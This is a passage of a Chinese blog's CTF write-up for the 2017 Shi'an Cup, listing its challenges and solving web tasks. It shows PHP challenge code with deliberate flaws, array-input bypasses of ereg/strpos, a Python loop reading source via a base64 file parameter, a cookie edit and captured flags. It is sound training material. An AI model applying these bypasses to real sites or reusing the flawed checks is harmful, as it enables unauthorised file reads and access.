<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="T3stzer0">


    <meta name="subtitle" content="思考">




<title>世安杯-WriteUp | T3stzer0&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    



  <!-- for theme: default is false -->
  <!-- for page: default is true -->

<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">



<meta name="generator" content="Hexo 5.2.0"></head>
<body>
	
		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
       <script type="text/javascript" src="/js/wrapImage.js"></script>
   
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>

<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>

        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
			expand_toc()
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">世安杯-WriteUp</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十月 9, 2017</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/CTF/">CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/9-26.jpg"> &gt;
一个比较无语的比赛，还是记录一下解题姿势</p>
<a id="more"></a>
<p>这是一个实验吧和西普学院搞的比赛，说实话办得不太用心
题目基本都是以前CTF或者实验吧的一些原题，水份太多了，连flag都没改，直接搜到之前的wp提交就行了，这也是比赛很无语的一个地方</p>
<p>还是记录一下姿势</p>
<h3 id="题目">题目</h3>
<table style="width:100%;">
<colgroup>
<col style="width: 16%">
<col style="width: 16%">
<col style="width: 16%">
<col style="width: 16%">
<col style="width: 16%">
<col style="width: 16%">
</colgroup>
<thead>
<tr class="header">
<th>类型</th>
<th>题目</th>
<th>答题链接</th>
<th>描述</th>
<th>分值</th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>web</td>
<td>ctf入门级题目</td>
<td>http://ctf1.shiyanbar.com/shian-rao/</td>
<td>有源码哦！</td>
<td>100</td>
<td></td>
</tr>
<tr class="even">
<td>曲奇</td>
<td>http://ctf1.shiyanbar.com/shian-quqi/</td>
<td>曲奇特别好吃！！！</td>
<td>225</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>类型</td>
<td>http://ctf1.shiyanbar.com/shian-leixing/</td>
<td>php有好多类型啊</td>
<td>200</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>登录</td>
<td>http://ctf1.shiyanbar.com/shian-s/</td>
<td>有提示</td>
<td>150</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>admin</td>
<td>http://ctf1.shiyanbar.com/shian-du/</td>
<td>you are not admin!</td>
<td>250</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>逆向</td>
<td>console</td>
<td>http://ctf1.shiyanbar.com/shian-file/console.rar</td>
<td>好像是微软的语言吧。</td>
<td>200</td>
<td></td>
</tr>
<tr class="odd">
<td>getflag</td>
<td>http://ctf1.shiyanbar.com/shian-file/get_flag.rar</td>
<td>算法其实特别简答，但是好像无法静态啊!啊！啊！</td>
<td>225</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>bin</td>
<td>http://ctf1.shiyanbar.com/shian-file/re.rar</td>
<td>linux可执行程序逆向一则。</td>
<td>300</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>动态暴力破解</td>
<td>http://ctf1.shiyanbar.com/shian-file/baopo.rar</td>
<td>下断点，然后手工暴力破解</td>
<td>275</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>android</td>
<td>http://ctf1.shiyanbar.com/shian-file/android.rar</td>
<td>apk的逆向</td>
<td>250</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>简单算法</td>
<td>http://ctf1.shiyanbar.com/shian-file/hackme.rar</td>
<td>一个简单的算法而已。</td>
<td>200</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>隐写</td>
<td>low</td>
<td>http://ctf1.shiyanbar.com/shian-file/low.rar</td>
<td>low low check out!</td>
<td>250</td>
<td></td>
</tr>
<tr class="odd">
<td>斑马斑马</td>
<td>http://ctf1.shiyanbar.com/shian-file/banmabanma.rar</td>
<td>斑马斑马，你不要睡着啦，再给我看看你受伤的尾巴，我不想去触碰你伤口的疤，我只想掀起你的头发。</td>
<td>125</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>CreateByWho</td>
<td>http://ctf1.shiyanbar.com/shian-file/CreateByWho.rar</td>
<td>零碎的二维码，好像还缺少几块！！！</td>
<td>200</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>适合作为桌面的图片</td>
<td>http://ctf1.shiyanbar.com/shian-file/desktop.rar</td>
<td>让你的才思迸发出来吧！！</td>
<td>150</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>杂项</td>
<td>reverseMe</td>
<td>http://ctf1.shiyanbar.com/shian-file/reverseMe.rar</td>
<td>这是一个什么文件呢？</td>
<td>150</td>
<td></td>
</tr>
<tr class="odd">
<td>珍妮的qq号</td>
<td>http://ctf1.shiyanbar.com/shian-file/zhenni.rar</td>
<td>珍妮的QQ是一个靓号哦</td>
<td>100</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>心仪的公司</td>
<td>http://ctf1.shiyanbar.com/shian-file/webshell.rar</td>
<td>小黑在拿到webshell后，马上就获得了自己心仪公司的照片</td>
<td>150</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>密码学</td>
<td>des</td>
<td>http://ctf1.shiyanbar.com/shian-file/decode.rar</td>
<td>DES加密算法！！</td>
<td>400</td>
<td></td>
</tr>
<tr class="even">
<td>rsa</td>
<td>http://ctf1.shiyanbar.com/shian-file/rsa.rar</td>
<td>rsa</td>
<td>300</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<hr>
<p>Web整体比较简单 ## Web #### ctf入门级题目 直接给出源码</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="va">$flag</span> <span class="op">=</span> <span class="st">&#39;*********&#39;</span><span class="ot">;</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span> (<span class="va">$_GET</span>[<span class="st">&#39;password&#39;</span>])) &#123;</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="er">ereg</span> (<span class="st">&quot;^[a-zA-Z0-9]+$&quot;</span><span class="ot">,</span> <span class="va">$_GET</span>[<span class="st">&#39;password&#39;</span>]) <span class="op">===</span> <span class="kw">FALSE</span>)</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">echo</span> <span class="st">&#39;&lt;p class=&quot;alert&quot;&gt;You password must be alphanumeric&lt;/p&gt;&#39;</span><span class="ot">;</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span> <span class="cf">if</span> (<span class="fu">strpos</span> (<span class="va">$_GET</span>[<span class="st">&#39;password&#39;</span>]<span class="ot">,</span> <span class="st">&#39;--&#39;</span>) <span class="op">!==</span> <span class="kw">FALSE</span>)</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">die</span>(<span class="va">$flag</span>)<span class="ot">;</span></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span></span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        <span class="kw">echo</span> <span class="st">&#39;&lt;p class=&quot;alert&quot;&gt;Invalid password&lt;/p&gt;&#39;</span><span class="ot">;</span></span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
<p><strong>分析:</strong>
题目的意思是既让你输入<code>a-zA-Z0-9</code>的数字字母又叫你输入包含<code>--</code>字符的password
，逻辑上显然是不通的，所以我们需要的是绕过ereg和strpos。
用数组传递就能满足条件了
ereg无法处理数组，当$__GET['password']为数组的时候会返回FALSE,而strpos找不到<code>--</code>也会返回FALSE
故传一个数组即可满足条件</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/21-05-53.jpg"></p>
<p><code>flag&#123;Maybe_using_rexpexp_wasnt_a_clever_move&#125;</code></p>
<h4 id="曲奇">曲奇</h4>
<p>进去就是一个看起来提示性很强的url</p>
<pre class="url"><code>http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&amp;file=a2V5LnR4dA==</code></pre>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/21-13-04.jpg"></p>
<p><code>a2V5LnR4dA==</code>base64 decode得key.txt
顺理成章地想到文件读取
尝试访问http://ctf1.shiyanbar.com/shian-quqi/key.txt 成功访问到相同内容
且<code>line</code>这个参数经过测试应该是读取第几行的内容的作用
故写了几行Python读取源码</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span>  <span class="st">&quot;http://ctf1.shiyanbar.com/shian-quqi/index.php?line=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;file=aW5kZXgucGhw&quot;</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">xrange</span>(<span class="dv">100</span>):</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span> requests.get(url.<span class="bu">format</span>(i,)).text,</span></code></pre></div>
<p>得到源码</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">error_reporting</span>(<span class="dv">0</span>)<span class="ot">;</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="va">$file</span><span class="op">=</span><span class="fu">base64_decode</span>(<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>])<span class="ot">?</span><span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>]<span class="ot">:</span><span class="st">&quot;&quot;</span>)<span class="ot">;</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="va">$line</span><span class="op">=</span><span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;line&#39;</span>])<span class="ot">?</span><span class="fu">intval</span>(<span class="va">$_GET</span>[<span class="st">&#39;line&#39;</span>])<span class="ot">:</span><span class="dv">0</span><span class="ot">;</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="va">$file</span><span class="op">==</span><span class="st">&#39;&#39;</span>) <span class="fu">header</span>(<span class="st">&quot;location:index.php?line=&amp;file=a2V5LnR4dA==&quot;</span>)<span class="ot">;</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="va">$file_list</span> <span class="op">=</span> <span class="dt">array</span>(</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;0&#39;</span> =&gt;<span class="st">&#39;key.txt&#39;</span><span class="ot">,</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;1&#39;</span> =&gt;<span class="st">&#39;index.php&#39;</span><span class="ot">,</span></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>)<span class="ot">;</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$_COOKIE</span>[<span class="st">&#39;key&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="va">$_COOKIE</span>[<span class="st">&#39;key&#39;</span>]<span class="op">==</span><span class="st">&#39;li_lr_480&#39;</span>)&#123;</span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="va">$file_list</span>[<span class="dv">2</span>]<span class="op">=</span><span class="st">&#39;thisis_flag.php&#39;</span><span class="ot">;</span></span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="fu">in_array</span>(<span class="va">$file</span><span class="ot">,</span> <span class="va">$file_list</span>))&#123;</span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="va">$fa</span> <span class="op">=</span> <span class="fu">file</span>(<span class="va">$file</span>)<span class="ot">;</span></span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="va">$fa</span>[<span class="va">$line</span>]<span class="ot">;</span></span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
<p>思路很简单，直接用burp改个cookie就好了</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/21-20-13.jpg"></p>
<p><code>flag&#123;UHGgd3rfH*(3HFhuiEIWF&#125;</code></p>
<h4 id="类型">类型</h4>
<p>直接是源码</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a> <span class="op">&lt;</span><span class="ot">?</span>php</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="fu">show_source</span>(<span class="cn">__FILE__</span>)<span class="ot">;</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span><span class="op">=</span><span class="dv">0</span><span class="ot">;</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="va">$b</span><span class="op">=</span><span class="dv">0</span><span class="ot">;</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="va">$c</span><span class="op">=</span><span class="dv">0</span><span class="ot">;</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="va">$d</span><span class="op">=</span><span class="dv">0</span><span class="ot">;</span></span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;x1&#39;</span>]))</span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>&#123;</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        <span class="va">$x1</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;x1&#39;</span>]<span class="ot">;</span></span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>        <span class="va">$x1</span><span class="op">==</span><span class="st">&quot;1&quot;</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">switch</span> (<span class="va">$x1</span>)</span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        &#123;</span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">0</span><span class="ot">:</span></span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">1</span><span class="ot">:</span></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>                <span class="va">$a</span><span class="op">=</span><span class="dv">1</span><span class="ot">;</span></span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>                <span class="cf">break</span><span class="ot">;</span></span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="va">$x2</span><span class="op">=</span><span class="dt">(array)</span><span class="fu">json_decode</span>(<span class="pp">@</span><span class="va">$_GET</span>[<span class="st">&#39;x2&#39;</span>])<span class="ot">;</span></span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="fu">is_array</span>(<span class="va">$x2</span>))&#123;</span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>    <span class="fu">is_numeric</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>])<span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>])&#123;</span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>        (<span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>]<span class="op">&gt;</span><span class="dv">2017</span>)<span class="ot">?</span><span class="va">$b</span><span class="op">=</span><span class="dv">1</span><span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="fu">is_array</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>]))&#123;</span>
<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span>(<span class="fu">count</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>])<span class="op">!==</span><span class="dv">2</span> <span class="op">OR</span> <span class="op">!</span><span class="fu">is_array</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>][<span class="dv">0</span>])) <span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">;</span></span>
<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>        <span class="va">$p</span> <span class="op">=</span> <span class="fu">array_search</span>(<span class="st">&quot;XIPU&quot;</span><span class="ot">,</span> <span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>])<span class="ot">;</span></span>
<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>        <span class="va">$p</span><span class="op">===</span><span class="kw">false</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">foreach</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>] <span class="kw">as</span> <span class="va">$key</span>=&gt;<span class="va">$val</span>)&#123;</span>
<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>            <span class="va">$val</span><span class="op">===</span><span class="st">&quot;XIPU&quot;</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>        <span class="va">$c</span><span class="op">=</span><span class="dv">1</span><span class="ot">;</span></span>
<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a><span class="va">$x3</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;x3&#39;</span>]<span class="ot">;</span></span>
<span id="cb5-36"><a href="#cb5-36" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="va">$x3</span> <span class="op">!=</span> <span class="st">&#39;15562&#39;</span>) &#123;</span>
<span id="cb5-37"><a href="#cb5-37" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="fu">strstr</span>(<span class="va">$x3</span><span class="ot">,</span> <span class="st">&#39;XIPU&#39;</span>)) &#123;</span>
<span id="cb5-38"><a href="#cb5-38" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="fu">substr</span>(<span class="fu">md5</span>(<span class="va">$x3</span>)<span class="ot">,</span><span class="dv">8</span><span class="ot">,</span><span class="dv">16</span>) <span class="op">==</span> <span class="fu">substr</span>(<span class="fu">md5</span>(<span class="st">&#39;15562&#39;</span>)<span class="ot">,</span><span class="dv">8</span><span class="ot">,</span><span class="dv">16</span>)) &#123;</span>
<span id="cb5-39"><a href="#cb5-39" aria-hidden="true" tabindex="-1"></a>            <span class="va">$d</span><span class="op">=</span><span class="dv">1</span><span class="ot">;</span></span>
<span id="cb5-40"><a href="#cb5-40" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb5-41"><a href="#cb5-41" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb5-42"><a href="#cb5-42" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb5-43"><a href="#cb5-43" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="va">$a</span> <span class="op">&amp;&amp;</span> <span class="va">$b</span> <span class="op">&amp;&amp;</span> <span class="va">$c</span> <span class="op">&amp;&amp;</span> <span class="va">$d</span>)&#123;</span>
<span id="cb5-44"><a href="#cb5-44" aria-hidden="true" tabindex="-1"></a>    <span class="kw">include</span> <span class="st">&quot;flag.php&quot;</span><span class="ot">;</span></span>
<span id="cb5-45"><a href="#cb5-45" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="va">$flag</span><span class="ot">;</span></span>
<span id="cb5-46"><a href="#cb5-46" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb5-47"><a href="#cb5-47" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span> </span></code></pre></div>
<p>看来是要过关斩将了</p>
<p>一步一步来 <strong>先看第一关</strong></p>
<pre><code>if (isset($_GET[&#39;x1&#39;]))
&#123;
        $x1 = $_GET[&#39;x1&#39;];
        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;
        switch ($x1)
        &#123;
        case 0:
        case 1:
                $a=1;
                break;
        &#125;
&#125;</code></pre>
<p><code>x1</code> 不能是 <code>1</code> 但是又要 <code>case 1</code>
直接用不是数字来就好了，普通字母就能绕过了
为了加深理解，本地搭建了一下</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;x1&#39;</span>]))</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>&#123;</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$x1</span> <span class="op">=</span><span class="pp">@</span> <span class="va">$_GET</span>[<span class="st">&#39;x1&#39;</span>]<span class="ot">;</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="va">$x1</span><span class="op">==</span><span class="st">&quot;1&quot;</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">switch</span> (<span class="va">$x1</span>)</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    &#123;</span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">0</span><span class="ot">:</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>            <span class="kw">echo</span> <span class="st">&quot;= =0&quot;</span><span class="ot">;</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">1</span><span class="ot">:</span></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>            <span class="kw">echo</span> <span class="st">&quot;= =!&quot;</span><span class="ot">;</span></span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">2</span><span class="ot">:</span></span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>            <span class="kw">echo</span> <span class="st">&quot;= =2!&quot;</span><span class="ot">;</span></span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
